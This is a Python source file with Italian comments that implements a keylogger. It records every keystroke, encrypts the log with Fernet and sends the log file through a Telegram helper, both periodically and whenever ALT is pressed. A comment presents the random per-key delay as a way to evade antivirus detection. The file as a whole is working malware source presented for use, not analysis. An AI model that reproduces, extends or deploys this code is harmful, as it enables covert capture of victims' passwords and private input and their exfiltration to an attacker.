import threading
import time
import random
from pathlib import Path
from typing import Optional
from pynput import keyboard
from cryptography.fernet import Fernet
from Configuration import Configuration
from TelegramManager import send_file

class KeyLogger:
    """
    KeyLogger che registra i tasti premuti, li cifra e invia periodicamente il log via Telegram.
    """
    def __init__(self, config: Configuration, notifier=send_file):
        self.config = config
        self.log_path = Path(self.config.logPath) / self.config.logFileName
        self.keylogging_active = self.config.keyloggingIsActive
        self._listener: Optional[keyboard.Listener] = None
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self.notifier = notifier

        # Genera o carica la chiave Fernet
        key_file = Path(self.config.logPath) / 'secret.key'
        if key_file.exists():
            self.fernet = Fernet(key_file.read_bytes())
        else:
            key = Fernet.generate_key()
            key_file.write_bytes(key)
            self.fernet = Fernet(key)

        # Assicura che la cartella esista
        self.log_path.parent.mkdir(parents=True, exist_ok=True)

    def _encrypt_and_write(self, data: str) -> None:
        token = self.fernet.encrypt(data.encode('utf-8'))
        with self.log_path.open('ab') as f:
            f.write(token + b"\n")

    def _on_press(self, key: keyboard.Key) -> None:
        try:
            char = key.char
        except AttributeError:
            char = f'[{key.name}]'

        # Cifra e scrive sul file
        self._encrypt_and_write(char)

        # Evade AV con ritardo casuale
        time.sleep(random.uniform(0.01, 0.1))

        # Invia log se trigger manuale (es. ALT)
        if key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
            self.notifier(str(self.log_path), caption="Encrypted keylogger log")

    def start(self) -> None:
        if not self.keylogging_active:
            if self.config.debug:
                print("Keylogger disattivato.")
            return

        if self.config.debug:
            print("Keylogger attivo.")

        self._listener = keyboard.Listener(on_press=self._on_press)
        self._thread = threading.Thread(target=self._listener.start, daemon=True)
        self._thread.start()

        # Opzionale: invio periodico automatico del log
        threading.Thread(target=self._periodic_sender, daemon=True).start()

    def stop(self) -> None:
        if self._listener and self._listener.running:
            self._listener.stop()
            self._stop_event.set()
            if self.config.debug:
                print("Keylogger arrestato.")

    def _periodic_sender(self) -> None:
        interval = self.config.communicationFrequency * 60  # minuti -> secondi
        while not self._stop_event.wait(interval):
            self.notifier(str(self.log_path), caption="Encrypted keylogger log")


# Esempio di utilizzo:
if __name__ == '__main__':
    cfg = Configuration()
    kl = KeyLogger(cfg)
    kl.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        kl.stop()
